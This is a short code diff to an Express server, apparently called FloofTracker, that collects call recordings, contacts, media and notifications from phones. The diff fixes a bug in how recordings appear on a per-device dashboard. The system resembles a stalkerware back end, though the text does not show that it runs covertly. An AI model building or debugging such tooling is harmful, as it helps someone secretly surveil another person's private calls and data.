@@ -377,7 +377,6 @@ app.post('/device/notifications', async (req, res) => {
 app.post('/device/call-recording', async (req, res) => {
     try {
         const token = getToken(req);
-	const recordings = await CallRecording.find({ token }).sort({ recorded_at: -1 }).limit(50);
         await CallRecording.create({ token, ...req.body });
         console.log(`Call recording received from ${token}: ${req.body.filename}`);
         res.json({ success: true });
@@ -683,6 +682,7 @@ app.get('/device', async (req, res) => {
     const contacts = await Contact.find({ token });
     const media = await Media.find({ token }).sort({ date_taken: -1 });
     const notifications = await Notification.find({ token }).sort({ received_at: -1 }).limit(200);
+    const recordings = await CallRecording.find({ token }).sort({ recorded_at: -1 }).limit(50);
 
     res.send(`<!DOCTYPE html><html><head>
     <title>${device?.device_model || 'Device'} - FloofTracker</title>
@@ -758,7 +758,7 @@ app.get('/device', async (req, res) => {
 <!-- Recordings Tab -->
 <div id="tab-recordings" class="tab-content">
     <div class="card" style="padding:0">
-        ${Recordings.length === 0 ? '<p class="no-data">No call recordings</p>' : `
+        ${recordings.length === 0 ? '<p class="no-data">No call recordings</p>' : `
         <table>
             <tr><th>Filename</th><th>Date</th><th>Play</th></tr>
             ${recordings.map(r => `<tr>
